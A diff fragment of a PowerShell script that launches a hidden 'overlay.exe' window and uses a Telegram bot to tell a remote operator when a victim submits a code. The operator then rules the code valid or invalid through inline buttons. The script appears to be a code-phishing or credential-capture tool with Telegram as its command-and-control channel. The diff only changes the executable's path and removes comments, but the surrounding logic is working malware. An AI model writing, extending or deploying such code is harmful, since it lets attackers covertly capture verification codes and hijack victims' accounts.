@@ -87,20 +87,17 @@ while ($null -eq $theme) {
     }
 }
 
-Start-Process "$d\overlay.exe" -ArgumentList $theme -WindowStyle Hidden
+$overlayExe = "$d\overlay\overlay.exe"
+Start-Process $overlayExe -ArgumentList $theme -WindowStyle Hidden
 Start-Sleep 3
 Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🟢 Overlay opened — waiting for code...`"}"
 
-# Main loop: watch for code submission AND valid/invalid buttons
 $waitingForOutcome = $false
 while ($true) {
-    # Check if verify was pressed in overlay
     if (-not $waitingForOutcome -and (CheckSubmitted)) {
         $waitingForOutcome = $true
         Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🔔 Code submitted\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Valid`",`"callback_data`":`"valid`"},{`"text`":`"❌ Invalid`",`"callback_data`":`"invalid`"}]]}}"
     }
-
-    # Poll Telegram for outcome buttons
     $data = Poll $offset
     if ($data -and $data.result) {
         foreach ($upd in $data.result) {
